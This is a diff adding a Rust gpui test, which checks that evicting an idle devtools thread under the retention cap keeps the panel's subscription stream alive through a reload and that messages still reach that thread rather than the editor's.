+#[gpui::test]
+async fn evicting_a_subscribed_idle_devtools_thread_keeps_the_panels_stream_through_a_reload(
+    cx: &mut TestAppContext,
+) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let mut app = window(&fs, "/p/app", Some(loadable_connection()), cx).await;
+    let (_announce, panel) = connect_panel("/p/app", 1, &app, cx);
+    let thread = created_thread(&panel, &app, cx);
+    promote(&thread, cx);
+    let id = thread_id_of(&thread, cx);
+    panel.handle(
+        request(
+            "subscribe",
+            "s",
+            json!({ "target": { "thread_id": thread } }),
+        ),
+        &app.app_state(),
+        cx,
+    );
+    assert_eq!(reply(&panel.drain(cx), "s")["kind"], "snapshot");
+    let first_view = view_of(&app, id).expect("the window holds the devtools thread");
+
+    // A connected, idle devtools thread follows the editor's idle cap (design B3 Retention).
+    set_max_idle_retained_threads(0, cx);
+    open_another_editor_thread(&mut app);
+    let editor = crate::test_support::active_thread_id(&app.panel, &app.cx);
+    set_max_idle_retained_threads(5, cx);
+
+    let got = kinds(&panel.drain(cx));
+    assert!(
+        !got.contains(&"thread_closed".to_string()),
+        "B4 Eviction: the panel's stream is not ended: {got:?}"
+    );
+    assert!(
+        !got.iter().any(|kind| kind.starts_with("error")),
+        "no error either, not_found least of all (R5.8): {got:?}"
+    );
+    let reloaded = view_of(&app, id).expect("B4: reloaded through ensure_loaded");
+    assert_ne!(
+        reloaded, first_view,
+        "the cap did evict it: this is a reload, not a view kept back"
+    );
+    assert_ne!(editor, id, "the editor shows its own new thread");
+
+    let editor_messages = user_messages(&app);
+    panel.handle(
+        request(
+            "send",
+            "m",
+            json!({ "text": "still here", "attachments": [] }),
+        ),
+        &app.app_state(),
+        cx,
+    );
+    let sent = reply(&panel.drain(cx), "m");
+    assert_eq!(
+        sent["kind"], "sent",
+        "the stream still drives the thread: {sent}"
+    );
+    assert_eq!(
+        crate::test_support::active_thread_id(&app.panel, &app.cx),
+        editor,
+        "A2: the editor's active view never moved"
+    );
+    assert_eq!(
+        user_messages(&app),
+        editor_messages,
+        "the message went to the devtools thread, not the editor's"
+    );
+}
